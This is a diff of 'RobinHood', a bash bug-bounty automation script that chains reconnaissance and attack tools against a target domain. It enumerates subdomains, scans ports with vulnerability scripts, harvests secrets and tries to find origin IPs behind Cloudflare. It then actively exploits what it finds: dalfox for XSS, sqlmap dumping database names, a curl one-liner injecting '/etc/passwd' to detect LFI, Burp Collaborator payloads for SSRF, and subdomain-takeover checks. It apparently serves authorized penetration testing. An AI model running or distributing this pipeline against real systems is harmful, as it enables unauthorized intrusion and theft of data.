@@ -1,95 +1,152 @@
 #!/usr/bin/env bash
 
-## Run with: nohup ./RobinHood.sh DOMAIN 2>&1 & ##
+## RobinHood - Bug Hunting automation script for dreamers and low-hanging fruits 
+## https://github.com/CalfCrusher
+
+## Usage: Run in background mod with: nohup ./RobinHood.sh LARGE_SCOPE_DOMAIN OUT_OF_SCOPE_LIST 2>&1 &
+## Esample: nohup ./RobinHood.sh example.com vpn.example.com,test.example.com 2>&1 &
 
 # Save starting execution time
 start=`date +%s`
 
-# Save locations of tools
-SUBFINDER=$(which subfinder)
-AMASS=$(which amass)
-SUBLIST3R=$(which sublist3r)
-WAYBACKURLS=$(which waybackurls)
-HTTPX=$(which httpx)
-GXSS=$(which Gxss)
-GF=$(which gf)
-DALFOX=$(which dalfox)
-GOSPIDER=$(which gospider)
-SUBJACK=$(which subjack)
+echo ''
+echo 'RobinHood - Bug Hunting automation script for dreamers and low-hanging fruits'
+echo ''
+echo '* Running..\n\n'
 
-# Get Domain as first argument
+# Save locations of tools and file
+BURP_COLLAB_URL="" # Burp Collaborator (EDIT THIS)
+FINGERPRINTS="" # Subjack fingerprints location (EDIT THIS)
+CLOUDFLAIR="" # CloudFlair tool location (EDIT THIS)
+CENSYS_API_ID="" # Censys api id for CloudFlair(EDIT THIS)
+CENSYS_API_SECRET="" # Censys api secret for CloudFlir (EDIT THIS)
+VULSCAN_NMAP_NSE="" # Vulscan NSE script for Nmap (EDIT THIS)
+JSUBFINDER_SIGN="" # Signature location for jsubfinder (EDIT THIS)
+NUCLEI_TEMPLATES="" # Directory templated for Nuclei (EDIT THIS)
+
+SUBFINDER=$(command -v subfinder)
+AMASS=$(command -v amass)
+SUBLIST3R=$(command -v sublist3r)
+HTTPX=$(command -v httpx)
+GF=$(command -v gf)
+GAU=$(command -v gau)
+DALFOX=$(command -v dalfox)
+QSREPLACE=$(command -v qsreplace)
+SUBJACK=$(command -v subjack)
+GOWITNESS=$(command -v gowitness)
+JSUBFINDER=$(command -v jsubfinder)
+NUCLEI=$(command -v nuclei)
+SQLMAP=$(command -v sqlmap)
+NMAP=$(command -v nmap)
+
+# Get large scope domain as first argument
 HOST=$1
 
-# Get Fingerprints for subjack tool
-FINGERPRINTS=$(find ~/go/pkg/ -name fingerprints.json)
+# Get list of excluded subdomains as second argument
+OUT_OF_SCOPE_SUBDOMAINS=$2
 
-echo ''
-echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
-echo "~~~~~~~SUBDOMAINS ENUMERATION~~~~~~~~" 
-echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
-echo ''
-
-# Search for subdomains
+# Subdomains Enumeration
 $SUBLIST3R -d $HOST -o subdomains_$HOST.txt
 $SUBFINDER -d $HOST -silent | awk -F[ ' {print $1}' | tee -a subdomains_$HOST.txt
-$AMASS enum -passive -d $HOST -timeout 10 | tee -a subdomains_$HOST.txt
+$AMASS enum -passive -d $HOST | tee -a subdomains_$HOST.txt
 
-echo ''
-echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
-echo "~~~~CHECKING SUBDOMAINS WITH HTTPX~~~~" 
-echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
-echo ''
+# Exclude out of scope subdomains
+if [ ! -z "$OUT_OF_SCOPE_SUBDOMAINS" ]
+then
+    set -f
+    array=(${OUT_OF_SCOPE_SUBDOMAINS//,/ })
+    for i in "${!array[@]}"
+    do
+            subdomain="${array[i]}"
+            sed -i "/$subdomain/d" ./subdomains_$HOST.txt
+    done
+fi
 
-# Output live sites (Redirects are followed)
-cat subdomains_$HOST.txt | sort -u | $HTTPX -silent | tee live_sites_$HOST.txt
+# Check live subdomains and remove duplicates
+cat subdomains_$HOST.txt | $QSREPLACE -a | $HTTPX -silent | tee live_subdomains_$HOST.txt
 
-echo ''
-echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
-echo "~~~~~~~~~CHECKING WAYBACKURLS~~~~~~~~" 
-echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
-echo ''
+# Scan with NMAP and Vulners
+if [ ! -z "$VULSCAN_NMAP_NSE" ]
+then
+    $NMAP -Pn -sV -oN nmap_results_$HOST.txt -iL subdomains_$HOST.txt --script=$VULSCAN_NMAP_NSE -T2 --top-ports 1000
+    sed -i '/Failed to resolve/d' nmap_results_$HOST.txt # Remove lines fronm log for those subs that aren't up
+fi
 
-# Saves waybackurls in a file
-cat live_sites_$HOST.txt | $WAYBACKURLS | tee waybackurls_$HOST.txt
+# Get screenshots of subdomains
+$GOWITNESS file -f live_subdomains_$HOST.txt
 
-# Remove empty lines
-sed -i '/^$/d' waybackurls_$HOST.txt
+# Search for secrets
+if [ ! -z "$JSUBFINDER_SIGN" ]
+then
+    $JSUBFINDER search -f live_subdomains_$HOST.txt -s --sig $JSUBFINDER_SIGN jsubfinder_secrets_$HOST.txt
+fi
 
-echo ''
-echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
-echo "~~~~~~~~~SUBDOMAINS TAKEOVER~~~~~~~~~" 
-echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
-echo ''
+# Get URLs with gau
+cat live_subdomains_$HOST.txt | $GAU --mc 200 | $QSREPLACE -a | tee live_urls_$HOST.txt
 
-# Search for Subdomains TakeOver
-$SUBJACK -w subdomains_$HOST.txt -t 30 -o subdomains_takeover_$HOST.txt -ssl -c $FINGERPRINTS -v -a
+# Run Nuclei on live subdomains
+if [ ! -z "$NUCLEI_TEMPLATES" ]
+then
+    $NUCLEI -silent -t $NUCLEI_TEMPLATES -list live_subdomains_$HOST.txt -timeout 10 -rl 10 -bs 5 -c 5 -hc 2 -o nuclei_results_$HOST.txt
+fi
 
-echo ''
-echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
-echo "~~~~~~SEARCH XSS ON WAYBACK URLS~~~~~" 
-echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
-echo ''
+# Extract cloudflare protected hosts from nuclei output
+cat nuclei_results_$HOST.txt | grep ":cloudflare" | awk '{print $(NF)}' | sed -E 's/^\s*.*:\/\///g' | $QSREPLACE -a | sed 's/\///'g | tee cloudflare_hosts_$HOST.txt
 
-# SEARCH FOR XSS THROUGH WAYBACKURLS
-cat waybackurls_$HOST.txt | $GF xss | tee wayback_gf_$HOST.txt
-cat wayback_gf_$HOST.txt | $GXSS -p Xss -u "Google Bot" -o wayback_Gxss_$HOST.txt
-sort -u wayback_Gxss_$HOST.txt | grep . | tee wayback_Gxss_$HOST.txt
-cat wayback_Gxss_$HOST.txt | $DALFOX pipe -S -o wayback_dalfox_POCs_$HOST.txt
+# Try to get origin ip using SSL certificate (cloudflair and censys) YOU NEED YOUR API KEYS!
+if [ ! -z "$CENSYS_API_ID" ]
+then
+    while IFS='' read -r DOMAIN || [ -n "${DOMAIN}" ]; do
+        python3 $CLOUDFLAIR $DOMAIN --censys-api-id $CENSYS_API_ID --censys-api-secret $CENSYS_API_SECRET | tee -a origin_$HOST.txt
+        sleep 15
+    done < cloudflare_hosts_$HOST.txt
+fi
 
-echo ''
-echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
-echo "~~~~~~SEARCH XSS USING GOSPIDER~~~~~~" 
-echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
-echo ''
+# Extract urls with possible XSS params
+cat live_urls_$HOST.txt | $GF xss > xss_urls_$HOST.txt
 
-# SEARCH FOR XSS MANUAL SPIDERING
-$GOSPIDER -S live_sites_$HOST.txt -c 10 -m 5 -d 5 -o gospider_$HOST --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}' | $GF xss | tee gospider_gf_$HOST.txt
-cat gospider_gf_$HOST.txt | $GXSS -p Xss -u "Google Bot" -o gospider_Gxss_$HOST.txt
-sort -u gospider_Gxss_$HOST.txt | grep . | tee gospider_Gxss_$HOST.txt
-cat gospider_Gxss_$HOST.txt | $DALFOX pipe -S -o gospider_dalfox_POCs_$HOST.txt
+# Extract urls with possible SQLi params
+cat live_urls_$HOST.txt | $GF sqli > sqli_urls_$HOST.txt
+
+# Extract urls with possible LFI params
+cat live_urls_$HOST.txt | $GF lfi > lfi_urls_$HOST.txt
+
+# Extract urls with possible SSRF params
+cat live_urls_$HOST.txt | $GF ssrf > ssrf_urls_$HOST.txt
+
+# Run Dalfox on XSS urls
+if [ ! -s xss_urls_$HOST.txt ]
+then
+    echo "\nRunning DALFOX..\n"
+    $DALFOX file xss_urls_$HOST.txt -w 10 -S -o dalfox_XSS_$HOST.txt
+fi
+
+# Run SQLMAP on SQLi urls
+if [ ! -s sqli_urls_$HOST.txt ]
+then
+    $SQLMAP -m sqli_urls_$HOST.txt --batch --random-agent --dbs -o sqlmap_$HOST
+fi
+
+# Test basic LFI vulnerability
+cat lfi_urls_$HOST.txt | $QSREPLACE "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -sk "%" 2>&1 | grep -q "root:x" && echo "VULNERABLE! %"' | tee lfi_vulnerable_urls_$HOST.txt
+
+# Test for basic SSRF using Burp Collaborator
+if [ ! -z "$BURP_COLLAB_URL" ]
+then
+    cat ssrf_urls_$HOST.txt | grep "=" | $QSREPLACE $BURP_COLLAB_URL
+fi
+
+# Search for subdomains takeover
+if [ ! -z "$FINGERPRINTS" ]
+then
+    $SUBJACK -w subdomains_$HOST.txt -t 50 -timeout 25 -o sub_takeover_$HOST.txt -ssl -c $FINGERPRINTS -v
+fi
 
 # Save finish execution time
 end=`date +%s`
 echo ''
-echo "********* COMPLETED *********"
-echo Execution time was `expr $end - $start` seconds.
+echo "********* COMPLETED ! *********"
+echo ''
+echo "Fork it on https://github.com/CalfCrusher/RobinHood and make the world a better place"
+echo ''
+echo Execution time was `expr $end - $start` seconds
